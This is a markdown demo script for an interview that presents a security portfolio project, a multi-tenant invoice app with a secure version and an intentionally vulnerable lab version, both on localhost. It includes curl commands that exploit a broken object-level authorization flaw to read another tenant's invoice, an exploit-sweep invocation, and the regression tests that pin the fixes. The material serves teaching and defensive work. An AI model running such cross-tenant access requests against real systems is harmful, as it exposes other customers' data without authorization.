# Interview Demo Script (~10 min)

Goal: prove the full security-engineering lifecycle — model, exploit, fix,
regression-test — on one vulnerability, then show the pattern holds for all four.

## Setup (before the call)

```bash
# Destructive: recreates the shared PostgreSQL volume (secure and lab data).
make db-reset && make seed
# Terminal 1: make run-secure   (http://127.0.0.1:8000)
# Terminal 2: make run-lab      (http://127.0.0.1:8001)
```

If short on time, seed only and boot on demand; server lifespan runs `init_db()`.

## Minute 0–2 — Frame it (threat model)

- Multi-tenant invoice SaaS; tenant boundary is the core asset
  (`docs/threat-model/threat-model.md`).
- All auth decisions in one policy class; routes never check permissions
  (`docs/architecture/architecture.md`).
- Four intentional labs, one per OWASP category
  (`docs/vulnerabilities/lab-0X-*.md`).

## Minute 2–6 — Live exploit: LAB-01 BOLA

Attacker: `charlie@acme.com` (MEMBER, Acme). Victim: Eve's Globex invoice.

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:8001/api/v1/auth/token \
  -H 'Content-Type: application/json' \
  -d '{"email":"charlie@acme.com","password":"password123"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
# Victim ID: login as eve@globex.com, GET /api/v1/invoices, copy "Marketing campaign" id
curl -s http://127.0.0.1:8001/api/v1/invoices/<EVE_ID> -H "Authorization: Bearer $TOKEN"
# -> 200, Globex data disclosed
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8000/api/v1/invoices/<EVE_ID> \
  -H "Authorization: Bearer $SECURE_TOKEN"
# -> 404 (existence hidden, not 403 — explain the oracle argument)
```

Talking points while it runs: `get_by_id` with no tenant filter
(`vulnerable_app.py:63`) vs tenant-scoped fetch + policy + 404
(`services/__init__.py:110-118`, `errors.py:81-89`).

## Minute 6–8 — The full sweep

```bash
uv run python scripts/exploit_scenarios.py --all --compare \
  --target http://127.0.0.1:8001 --attacker charlie@acme.com --password password123 \
  --victim-invoice <EVE_ID> --own-invoice <OWN_ID>
# -> 4/4 SUCCESS lab, 4/4 BLOCKED secure
```

Then show the tests that pin each fix: `pytest tests/security -q`
(15 tests, incl. the M-1 inner-layer pin — explain why the HTTP test alone
couldn't catch a widened allow-list).

## Minute 8–10 — Process proof

- Gates: 66 passed, 80.54% coverage, mypy/ruff clean. See
  `clean-setup-verification.md` for the clean-clone baseline and current-worktree revalidation.
- Close: "pick any LAB-0X file — each one traces threat to test."

## Fallbacks

- No Docker? Run `pytest tests/security -v` — the lab-vs-secure contrast runs
  fully in-process (both apps + real Postgres, no servers needed).
- No DB? `pytest tests/unit` (35 tests: policies + JWT forgeries) needs none.
- Live exploit fails? Server lifespan self-inits schema, but `seed_demo.py`
  needs tables first and pytest teardown drops them — re-run `make db-reset
  && make seed`, then retry.
